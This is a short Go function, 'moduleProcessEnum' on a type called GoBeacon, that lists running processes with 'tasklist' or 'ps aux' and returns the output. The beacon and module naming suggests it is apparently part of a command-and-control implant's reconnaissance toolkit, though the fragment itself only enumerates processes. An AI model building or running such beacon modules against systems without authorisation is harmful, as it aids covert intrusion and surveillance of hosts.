// Process Enumeration module - List running processes

func (b *GoBeacon) moduleProcessEnum(parameters string) string {
	var result strings.Builder
	result.WriteString("=== PROCESS ENUMERATION ===\n")

	if runtime.GOOS == "windows" {
		cmd := exec.Command("tasklist", "/FO", "CSV")
		output, err := cmd.Output()
		if err != nil {
			return fmt.Sprintf("Error enumerating processes: %v", err)
		}
		result.Write(output)
	} else {
		cmd := exec.Command("ps", "aux")
		output, err := cmd.Output()
		if err != nil {
			return fmt.Sprintf("Error enumerating processes: %v", err)
		}
		result.Write(output)
	}

	return result.String()
}
